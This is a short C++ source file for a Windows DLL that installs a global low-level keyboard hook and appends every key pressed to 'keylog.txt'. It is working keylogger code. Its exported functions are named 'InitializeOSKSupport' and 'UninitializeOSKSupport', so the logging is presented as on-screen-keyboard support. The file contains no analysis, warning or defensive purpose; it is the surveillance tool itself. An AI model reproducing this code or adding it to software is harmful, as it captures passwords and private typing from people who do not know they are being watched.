// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <string>

#pragma data_seg(".shared")
HINSTANCE hinst = NULL;
HHOOK keyboardHook = NULL;
#pragma data_seg()
#pragma comment(linker, "/SECTION:.shared,RWS")

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN)
    {
        DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;
        FILE* fp;
        errno_t err;
        if (vkCode >= 0x0D && vkCode <= 0x87) {//if (vkCode >= 0x30 && vkCode <= 0x5A) {
            if ((err = fopen_s(&fp, "keylog.txt", "a+")) == 0) {

                fputc(vkCode, fp);
                fclose(fp);
            }
            else {
                OutputDebugStringA("Write to file failed");
            }
        }
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

extern "C" __declspec(dllexport) void InitializeOSKSupport()
{
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hinst, 0);
}

extern "C" __declspec(dllexport) void UninitializeOSKSupport()
{
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
    }
}

BOOL APIENTRY DllMain(HINSTANCE hInstance, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        hinst = hInstance;
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

